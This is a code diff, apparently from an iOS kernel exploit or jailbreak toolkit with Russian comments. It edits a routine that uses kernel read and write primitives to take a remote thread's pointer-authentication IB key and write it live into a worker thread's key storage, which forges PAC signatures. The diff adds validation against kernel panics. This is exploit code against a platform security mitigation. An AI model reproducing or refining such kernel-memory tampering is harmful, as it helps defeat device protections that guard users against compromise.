@@ -162,20 +162,32 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
     uint64_t kva = [KPDump rcResolveThreadKVA:mp];
     if (!kva) { paclog(@"    [rp] worker thread_t resolve FAIL"); g_pac_stop = 1; return 0; }
 
+    // Независимая валидация worker thread_t: обратная ссылка tro→task должна
+    // вести на наш таск (та же, что и у remote-треда). Резолвер для pthread
+    // может вернуть чужой объект — запись по нему = паника (доказано).
+    uint64_t tro_main = kp_pac_nativestrip(kp_rc_kread64(remotethreadaddr + 0x3E8));
+    uint64_t selfTask = kp_pac_nativestrip(kp_rc_kread64(tro_main + 0x28));
+    uint64_t tro_w = kp_pac_nativestrip(kp_rc_kread64(kva + 0x3E8));
+    uint64_t tsk_w = kp_pac_nativestrip(kp_rc_kread64(tro_w + 0x28));
+    int kva_ok = (selfTask & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL && tsk_w == selfTask;
+    paclog(@"    [rp] validate: selfTask=%#llx worker→task=%#llx %@", selfTask, tsk_w,
+           kva_ok ? @"OK" : @"— НЕ НАШ ТРЕД, стоп (записей не будет)");
+    if (!kva_ok) { g_pac_stop = 1; usleep(20000); return 0; }
+
     // upcb — настоящее хранилище ключей (arm_pac_key_state_t), тип 0x21.
-    // Пишем ТОЛЬКО подтверждённый ключевой слот +0xE8 (IB): соседи — saved
-    // state, мусор туда = copy_validate panic (доказано ребутом).
+    // ОБА upcb обязаны быть kernel VA — запись по user VA = copy_validate panic.
     uint64_t upcb = kp_pac_nativestrip(kp_rc_kread64(kva + 0x100));
-    uint64_t rupcb_raw = kp_rc_kread64(remotethreadaddr + 0x100);
-    uint64_t rupcb = kp_pac_nativestrip(rupcb_raw);
+    uint64_t rupcb = kp_pac_nativestrip(kp_rc_kread64(remotethreadaddr + 0x100));
+    int upcb_ok = (upcb & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
     int rupcb_ok = (rupcb & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
-    paclog(@"    [rp] worker upcb=%#llx remote upcb=%#llx %@", upcb, rupcb, rupcb_ok ? @"" : @"— невалиден, swap пропускаю");
+    int do_swap = upcb_ok && rupcb_ok;
+    paclog(@"    [rp] worker upcb=%#llx %@· remote upcb=%#llx %@", upcb,
+           upcb_ok ? @"" : @"— НЕ KERNEL VA!", rupcb, rupcb_ok ? @"" : @"— невалиден");
 
     uint64_t keyb_u = rupcb_ok ? kp_rc_kread64(rupcb + 0xE8) : 0;
-    paclog(@"    [rp] remote upcb IB(+0xE8)=%#llx", keyb_u);
-
-    uint64_t ob = kp_rc_kread64(upcb + 0xE8);
-    paclog(@"    [rp] worker orig IB(+0xE8)=%#llx", ob);
+    uint64_t ob = upcb_ok ? kp_rc_kread64(upcb + 0xE8) : 0;
+    paclog(@"    [rp] remote IB=%#llx · worker orig IB=%#llx · swap %@", keyb_u, ob,
+           do_swap ? @"идёт" : @"ПРОПУЩЕН (нет валидных upcb)");
 
     // baseline: worker signs with its own keys
     for (int i = 0; i < 500 && !g_pac_out; i++) usleep(1000);
@@ -183,10 +195,10 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
     uint64_t baselineB = g_pac_out_b;
     paclog(@"    [rp] baseline: pacia=%#llx pacib=%#llx", baseline, baselineB);
 
-    // live key swap — только подтверждённый слот +0xE8
-    if (rupcb_ok)
+    // live key swap — только подтверждённый слот +0xE8 и только в kernel VA
+    if (do_swap)
         kp_rc_kwrite64(upcb + 0xE8, keyb_u);
-    uint64_t rb = kp_rc_kread64(upcb + 0xE8);
+    uint64_t rb = upcb_ok ? kp_rc_kread64(upcb + 0xE8) : 0;
     paclog(@"    [rp] upcb IB после swap=%#llx", rb);
 
     uint64_t newsig = baseline, newsigB = baselineB;
@@ -198,10 +210,12 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
     paclog(@"    [rp] после swap: pacia=%#llx pacib=%#llx — %@", newsig, newsigB,
            newsigB != baselineB ? @"pacib ИЗМЕНИЛАСЬ — upcb ЖИВОЕ хранилище!" : @"pacib не изменилась за 300мс");
 
-    // restore original IB before the worker exits (dies clean)
-    kp_rc_kwrite64(upcb + 0xE8, ob);
-    uint64_t rb2 = kp_rc_kread64(upcb + 0xE8);
-    paclog(@"    [rp] restore: %@", (rb2 == ob) ? @"вернули" : @"НЕ ВЕРНУЛИ!");
+    // restore original IB — только если реально писали
+    if (do_swap) {
+        kp_rc_kwrite64(upcb + 0xE8, ob);
+        uint64_t rb2 = kp_rc_kread64(upcb + 0xE8);
+        paclog(@"    [rp] restore: %@", (rb2 == ob) ? @"вернули" : @"НЕ ВЕРНУЛИ!");
+    }
 
     g_pac_stop = 1;
     for (int i = 0; i < 100; i++) usleep(1000); // let the worker see the flag and exit
